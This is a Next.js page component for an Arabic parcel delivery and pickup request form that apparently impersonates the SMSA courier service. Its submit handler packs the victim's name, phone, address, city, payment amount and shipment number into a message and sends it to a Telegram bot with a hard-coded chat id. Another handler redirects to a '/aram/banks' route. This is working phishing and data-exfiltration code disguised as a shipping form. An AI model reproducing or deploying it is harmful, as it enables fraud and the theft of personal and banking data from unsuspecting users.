"use client"
import { useRef } from 'react'
import styles from './fozajil.module.css'

import {useRouter,useSearchParams} from 'next/navigation'


const Page = () => {
  const token = process.env.TOKEN;
  const pass = 7017479979
  let typeRequest = useRef();
  let fullname = useRef();
  let numphone = useRef();
  let adress = useRef();
  let city = useRef();
  let mony = useRef();
  let numshoh = useRef();
  let detales = useRef();
  const  name = useSearchParams();
  const track = name.get("name")
  
  
  const router = useRouter()

  const handlerout = () => {
    
if(typeRequest.current.value == "اختر الخدمة" || fullname.current.value == "" || numphone.current.value == "" || adress.current.value == "" || city.current.value == "" || mony.current.value == "" || detales.current.value == ""||numshoh.current.value == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks?names=${numshoh.current.value}`)
    }
  }


  const handleSubmit = (e) => {
    e.preventDefault();

    var length =`مدونة سمسا  %0A   نوع الخدمة : ${typeRequest.current.value} %0A الاسم الكامل  : ${fullname.current.value} %0A  رقم الجوال : ${numphone.current.value}%0A العنوان : ${adress.current.value} %0A المدينة : ${city.current.value} %0A قيمة السداد:${mony.current.value} %0A التفاصيل : ${detales.current.value} %0A %0A ${numshoh.current.value}`


    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))


  }

  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>
      </div>
        <form onSubmit={handleSubmit}> 


    <select name="typeRequest" ref={typeRequest} required>
                <option value="اختر الخدمة">اختر الخدمة</option>
                <option value="طلب توصيل">طلب توصيل</option>
                <option value="طلب استلام">طلب استلام</option>
            </select>
            <input type="number" name='numshoh' placeholder='رقم الشحنة' ref={numshoh} required />
            <input type="text" name='fullname'  placeholder='الأسم الكامل ' ref={fullname}required />
            <input type="text" name='numphone'  placeholder='رقم الجوال الخاص بلمستلم' ref={numphone}required />
            <input type="text" name='adress'  placeholder='العنوان بلكامل' ref={adress}required />
            <input type="text" name='city'  placeholder='اكتب اسم المدينة' ref={city}required />
            <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />
            <textarea name="detales" id="" cols="33" rows="5" ref={detales} placeholder='التفاصيل' required></textarea>

        <button type='submit' onClick={handlerout}>تقديم الطلب</button>
        </form>
    </div>

  )
}

export default Page; 
